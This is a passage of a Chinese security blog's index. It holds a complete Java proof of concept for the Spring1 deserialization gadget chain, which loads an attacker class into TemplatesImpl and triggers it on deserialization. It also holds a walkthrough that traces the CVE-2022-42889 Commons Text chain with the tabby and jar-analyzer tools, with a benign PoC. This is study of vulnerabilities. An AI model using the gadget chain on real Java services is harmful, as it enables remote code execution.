class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        byte[] classBytes = loadRemoteClass(&quot;http://127.0.0.1:8888/cb.class&quot;);</span><br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理</span><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span><br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject</span><br>        <span class="hljs-comment">// 并且会调用 method.invoke(返回值,args)</span><br>        <span class="hljs-comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span><br>        <span class="hljs-comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br>        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span><br>        <span class="hljs-comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span><br>        <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>        <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span><br><span class="hljs-comment">//        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="hljs-comment">//                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br><br>        <span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br>        <span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span><br>        <span class="hljs-comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc7&quot;</span>));<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><span class="hljs-comment">//</span><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc7&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] loadRemoteClass(String remoteClassUrl) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(remoteClassUrl);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> url.openConnection();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>             <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bufferedInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(inputStream);<br>             <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>()) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br>            <span class="hljs-keyword">while</span> ((bytesRead = bufferedInputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>            &#125;<br>            <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>su18 NB</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://su18.org/post/ysoserial-su18-3/#spring1">https://su18.org/post/ysoserial-su18-3/#spring1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tabby_jar-analyzer_commons-text</title>
    <link href="/2023/12/13/tabby-jar-analyzer-commons-text/"/>
    <url>/2023/12/13/tabby-jar-analyzer-commons-text/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-工具介绍"><a href="#0x01-工具介绍" class="headerlink" title="0x01 工具介绍"></a>0x01 工具介绍</h2><p>​<a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></p><p>TABBY 是一款针对 Java 语言的静态代码分析工具，相关工作已被接收发表在 The 53rd Annual IEEE&#x2F;IFIP International Conference on Dependable Systems and Networks (DSN 2023)，会议论文录用名单详见<a href="https://dsn2023.dei.uc.pt/program_research.html">DSN2023</a>。</p><p>TABBY使用静态分析框架 <a href="https://github.com/soot-oss/soot">Soot</a> 作为语义提取工具，将JAR&#x2F;WAR&#x2F;CLASS文件转化为代码属性图。 并使用 <a href="https://neo4j.com/">Neo4j</a> 图数据库来存储生成的代码属性图CPG。</p><p>​<a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p><p><code>Jar Analyzer</code> 是一个分析 <code>Jar</code> 文件的 <code>GUI</code> 工具：</p><ul><li>支持大 <code>Jar</code> 以及批量 <code>Jars</code> 分析 </li><li>方便地搜索方法之间的调用关系 </li><li>分析 <code>LDC</code> 指令定位 <code>Jar</code> 中的字符串 </li><li>一键分析 <code>Spring Controller/Mapping</code> </li><li>对于方法字节码和指令的高级分析 </li><li>一键反编译，优化对内部类的处理 </li><li>一键生成方法的 <code>CFG</code> 分析结果 </li><li>一键生成方法的 <code>Stack Frame</code> 分析结果 </li><li>自定义 <code>SQL</code> 语句进行高级分析</li></ul><h2 id="0x02-漏洞环境Apache-Commons-Text"><a href="#0x02-漏洞环境Apache-Commons-Text" class="headerlink" title="0x02  漏洞环境Apache Commons Text"></a>0x02  漏洞环境Apache Commons Text</h2><p>CVE-2022-42889 Apache Commons Text 1.5 &lt;&#x3D; Apache Commons Text &lt;&#x3D; 1.9</p><p>org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，攻击者可构造恶意文本，使得Apache Commons Text 在解析时执行任意恶意代码。</p><p><a href="https://repo1.maven.org/maven2/org/apache/commons/commons-text/1.9/commons-text-1.9.jar">Apache Commons Text 1.9</a></p><h2 id="0x03-使用jar-ayalyzer分析"><a href="#0x03-使用jar-ayalyzer分析" class="headerlink" title="0x03  使用jar-ayalyzer分析"></a>0x03  使用jar-ayalyzer分析</h2><p><img src="1701542509837-9a932a3a-ed26-435c-8408-8fe6fbcc894c-20231213233843707.png" alt="img"></p><p>导入后点击start engine。</p><p>我们知道CVE-2022-42889主要触发点是lookup调用了ScriptEngine的eval方法造成代码执行。</p><p><img src="1701542516105-69a93177-dab0-416c-a9d3-902fd7de7f50-20231213233844022.png" alt="img"></p><p>在search类别里进行搜索</p><p><img src="1701542521312-680b91da-fa02-47e5-ac1b-ab70b26d2068-20231213233843832.png" alt="img"></p><p>这里可以得到org.apache.commons.text.lookup$lookup方法调用了scriptEngine.eval。然后key可控， script &#x3D; keys[1]，所以慢慢往上走就可以了。</p><p><img src="1701542531309-72c89775-84ca-457d-b133-ea5d0682434b-20231213233845038.png" alt="img"></p><p>在call界面，有caller，callee两个界面。caller表示哪个方法调用了lookup方法，callee表示lookup里调用了什么方法。</p><p><img src="1701542537645-b7dacbd6-0c0d-4f7c-966b-54f7f9dcd6f9-20231213233844376.png" alt="img"></p><p>往上来到了StringLookup接口，上面是调用，下面是实现类。</p><p><img src="1701542541197-20f9c12a-7104-4515-8f69-ff576fd6e1b2-20231213233844930.png" alt="img"></p><p>也可以在impl里面查看接口的实现类。</p><p><img src="1701542545932-beb52cde-85a3-4435-a9ec-92e08bfcc52d-20231213233843996.png" alt="img"></p><p>往上来到了org.apache.commons.text$StringSubstitutor#resolveVariable, 可以看到都可传。</p><p><img src="1701542550368-ec85dbbf-d12e-4022-b707-60eb5a78d099-20231213233844246.png" alt="img"></p><p><img src="1701542554978-536ddcbc-61c3-4db4-9dab-e8aa12e2a0e3-20231213233844229.png" alt="img"></p><p>org&#x2F;apache&#x2F;commons&#x2F;text&#x2F;StringSubstitutor#substitute，之间如果有别的调用，慢慢分析也就有很多其他的触发链，但这个好像并没有</p><p><img src="1701542558672-b87f43ef-b90e-4590-abca-31e0b0ef0b3b-20231213233844510.png" alt="img"></p><p>最后可以看见replace调用。</p><p><img src="1701542563767-4a0c7bd6-1292-4354-9f29-8f515fc89f5d-20231213233844477.png" alt="img"></p><p>都是差不多的处理。</p><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StringSubstitutor</span> <span class="hljs-variable">stringSubstitutor</span> <span class="hljs-operator">=</span> StringSubstitutor.createInterpolator();<br>stringSubstitutor.replace(<span class="hljs-string">&quot;$&#123;script:javascript:2 + 2&#125;);</span><br></code></pre></td></tr></table></figure><p>整个使用流程下载感觉非常流畅，无脑。许少在ct一年成长的太快，弟弟我就是纯纯脚本小子。</p><p><img src="1701542570434-0b4fb78c-8694-45cd-99c9-35d8434c06c0-20231213233844636.png" alt="img"></p><p>advance里面有设置好漏洞字符，下面还引入gpt还有一个常用工具。哎，人与人差距太大了，要想上个月投ct安抚，简历都没过，真实服了。</p><h2 id="0x04-tabby"><a href="#0x04-tabby" class="headerlink" title="0x04 tabby"></a>0x04 tabby</h2><p>上面已经知道是起点replace。 终点为lookup。</p><p>那只需要一下语句分析得到调用图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542575487-1e835b7e-096e-4015-9b06-fbdb496eec30-20231213233845116.png" alt="img"></p><p>可以看到已经跑出链子。</p><p><img src="1701542579160-c482b5f4-67d3-4492-8530-499b98b739ec-20231213233844768.png" alt="img"></p><p><img src="1701542583735-a0aea128-c837-4bc9-b19f-2f60152eaf5e-20231213233844867.png" alt="img"></p><p>它是一个接口，实现类太多了，继续添加一点规则。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542590366-eed0ec3a-3916-41d7-a28c-3b517ade4090-20231213233845074.png" alt="img"></p><p>可以得到以上图，org.apache.commons.text.lookup.StringLookup是一个接口，其他的lookup方法都是去实现这个方法。所以这里用:ALIAS去修饰。最后我们走到的eval，所以还有写一条&#x2F;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m3:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;eval&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542597132-35cd9765-ccff-4eae-a67b-92bbbfcd1e3c-20231213233845181.png" alt="img"></p><p>可以看到完整的链子已经出来了。说实话，跑的挺久的，可能我电脑太老了。</p><p>优化一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span><span class="hljs-number">0.</span><span class="hljs-number">.1</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span><br>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;substitute&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m3:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m4:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;eval&quot;, CLASSNAME: &quot;javax.script.ScriptEngine&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542602613-79da88b3-c059-441d-bf99-b59f0bfaf660-20231213233845314.png" alt="img"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>jar-ayalyzer 分析单jar包比较好使，快是真的快，分析起来很流畅，多jar包还是用tabby。tabby使用起来，图形化很直观，就是跑sql语句太慢了（可能我电脑卡），可以分析多jar包，还有neo4j语句太难写了。（小孩才做选择，成人的世界就是全都要）</p><p>整体看来都很不错。只要source点，sink点就能一步步往上挖，这个时候，还是tabby比较好使，全跑出来，然后内眼看。</p><p>tabby内有许多定义好的sink点，很实用。</p><p><img src="1701542607981-a02aeb0e-0ff8-4651-b078-e463fd405ded-20231213233845517.png" alt="img"></p><p><img src="1701542612742-d3540034-16af-4c3a-af66-440aefcf3867-20231213233845511.png" alt="img"></p><p>这里没找到，应该是默认confg里面没有，所以没找到，所以有时候碰见了，可以写进去 ![image-<img src="t1701542618145-15a19937-f46f-41f7-85b0-57e5852bf347-20231213233845351.png" alt="img"></p><p><img src="1701542623492-1d3ae1a1-7d5c-4be1-88b8-97f733967e92-20231213233845516.png" alt="img"></p><p>自己写入sink点，可以成功查询到。</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">MATCH (source:Method &#123;NAME:<span class="hljs-string">&quot;replace&quot;</span>&#125;)<br>MATCH (sink:Method &#123;NAME:<span class="hljs-string">&quot;lookup&quot;</span>&#125;)&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]<br>                    -&gt;(cls1:Class &#123;NAME:<span class="hljs-string">&quot;org.apache.commons.text.lookup.StringLookup&quot;</span>&#125;)<br>MATCH (sink)-[:CALL*]-&gt;(m1:Method&#123;NAME:<span class="hljs-string">&quot;getByName&quot;</span>&#125;)<br>call tabby.beta.findPath(source,<span class="hljs-string">&quot;-&quot;</span>,sink,<span class="hljs-number">12</span>,<span class="hljs-literal">false</span>) YIELD path<br><span class="hljs-keyword">return</span> path<br></code></pre></td></tr></table></figure><p><img src="1701837000942-be1188d1-312e-4f4c-a196-ee15b1e274a0-20231213233845260.png" alt="img"></p><p>dns链</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06  参考链接"></a>0x06  参考链接</h2><p><a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></p><p><a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p><p><a href="https://www.anquanke.com/post/id/283625">https://www.anquanke.com/post/id/283625</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
